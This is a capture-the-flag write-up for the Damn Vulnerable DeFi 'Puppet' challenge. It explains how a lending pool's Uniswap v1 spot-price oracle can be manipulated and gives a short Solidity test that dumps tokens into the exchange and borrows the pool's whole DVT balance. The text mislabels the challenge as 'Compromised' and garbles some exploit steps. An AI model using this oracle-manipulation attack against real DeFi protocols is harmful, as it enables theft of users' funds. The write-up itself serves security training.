# Puppet

There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.

#
#



# Challenge overview

Press enter or click to view image in full size

[Official site](https://damnvulnerabledefi.xyz/challenges/puppet)  
I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

The Compromised challenge is the eighth level in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the funds from the pool.

It has 3 contracts:

1) IUniswapV1Exchange.sol : It stores the inventory used toswap funds  
2) IUniswapV1Factory.sol : It has interfaces which are useful  
3) PuppetPool.sol : It is the main contract which performs borrow actions

## PuppetPool.sol has main 1 function

borrow() : This function needs input of the how much worth of amount you wanna borrow and the address of the receiver. As borrow() function user needs to pay 2x of the worth amount of DVT token. Okay! let’s talk about how the borrow function calculates.


## function _computeOraclePrice()

This function calculates the exchange rate as per the funds ratio in the uniswapPair as an oracle. And as per the README.md the contract holds only 10 ether and 10 DVT tokens. So, the price of a DVT token is 1 ehter and we need to input 2 ether as collateral for borrowing 1 DVT token and we have 25 ether and 1000 DVTs in balance. I think you got the idea, there is an oracle manipulatiion vulnerability.

## Exploit logic :

i) Send all of the DVTs to teh uniswapair address

ii) this will cause massive inflation

iii) Exchange the DVTs from the pool with available eth

iv) Send all the DVTs to the recovery account

I hope you got the idea now, just try atleast once to write the poc according to the logic and if unsuccessfull u can take reference from below :

```solidity
    function test_puppet() public checkSolvedByPlayer {
        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV1Exchange.tokenToEthTransferInput(PLAYER_INITIAL_TOKEN_BALANCE, 9 ether, block.timestamp, player);

        lendingPool.borrow{value : 22 ether}(token.balanceOf(address(lendingPool)), recovery); 

        assertEq(token.balanceOf(address(lendingPool)), 0);
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE);
    }
```

>Okay! This much 

If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**